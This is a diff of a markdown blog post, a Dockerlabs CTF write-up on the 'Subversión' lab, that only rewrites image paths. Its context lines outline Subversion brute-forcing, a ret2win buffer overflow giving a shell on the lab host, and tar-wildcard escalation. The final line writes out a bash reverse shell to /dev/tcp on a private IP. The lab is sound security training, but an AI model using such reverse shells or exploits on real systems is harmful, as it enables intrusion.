@@ -5,7 +5,7 @@ title: WriteUp Subversión - Dockerlabs
 slug: subversion-writeup-dockerlabs-en
 featured: false
 draft: false
-ogImage: "assets/subversion/OpenGraph.png"
+ogImage: "../../assets/images/subversion/OpenGraph.png"
 tags:
   - writeup
   - dockerlabs
@@ -18,7 +18,7 @@ lang: en
 ---
 
 
-![Alt text](/assets/subversion/OpenGraph.png)
+![Alt text](../../assets/images/subversion/OpenGraph.png)
 
 This lab, available on the Dockerlabs platform, covers multiple security challenges: from brute-forcing Subversion and guessing an insecure random number to exploiting a buffer overflow and escalating privileges using the tar wildcard technique.
 
@@ -94,7 +94,7 @@ Finished
 
 On the port 80 route, we can see in the browser:  
 
-![Alt text](/assets/subversion/image.png)  
+![Alt text](../../assets/images/subversion/image.png)  
 
 The `/upload` path is a text file with the following content:  
 
@@ -151,7 +151,7 @@ We discovered a repository, but it is private. We try using the username we foun
 
 We attempt to log in with a different user, `test`, and with `svnuser`.  
 
-![Alt text](/assets/subversion/image-1.png)  
+![Alt text](../../assets/images/subversion/image-1.png)  
 
 We can see that the user `svnuser` appears to belong to this service, although we already suspected it from the name.  
 
@@ -487,7 +487,7 @@ if __name__ == '__main__':
 
 We manage to guess the random number and enter the `magic_text()` function, where we find a buffer overflow.  
 
-![alt text](/assets/subversion/aleatorio-ok.png)  
+![alt text](../../assets/images/subversion/aleatorio-ok.png)  
 
 ### Buffer Overflow  
 
@@ -546,7 +546,7 @@ We will attempt a **ret2win** by calling the "ghost" function `shell()`. To do t
 $ gdb -q subversion
 ```
 
-![alt text](/assets/subversion/gdb-shell.png)  
+![alt text](../../assets/images/subversion/gdb-shell.png)  
 
 We obtain the `rdi` register address just before calling `system` and take note of it.  
 
@@ -623,7 +623,7 @@ if __name__ == '__main__':
 
 We execute it and obtain a shell on our own system, working as expected.  
 
-![alt text](/assets/subversion/exploit-1.png)  
+![alt text](../../assets/images/subversion/exploit-1.png)  
 
 Now, we modify the first lines of the exploit so that instead of executing the downloaded `subversion` binary, it connects to port `1789`.  
 
@@ -635,13 +635,13 @@ p = remote('172.17.0.2', '1789')
 
 We run the exploit again and obtain a shell as user `luigi` on the server.  
 
-![alt text](/assets/subversion/exploit-2.png)  
+![alt text](../../assets/images/subversion/exploit-2.png)  
 
 ## Privilege Escalation  
 
 To work more comfortably on the server, we create another shell and set up tty handling.  
 
-![alt text](/assets/subversion/escalada.png)  
+![alt text](../../assets/images/subversion/escalada.png)  
 
 ```
 /usr/bin/bash -c "/usr/bin/bash -i >& /dev/tcp/192.168.1.116/12345 0>&1"
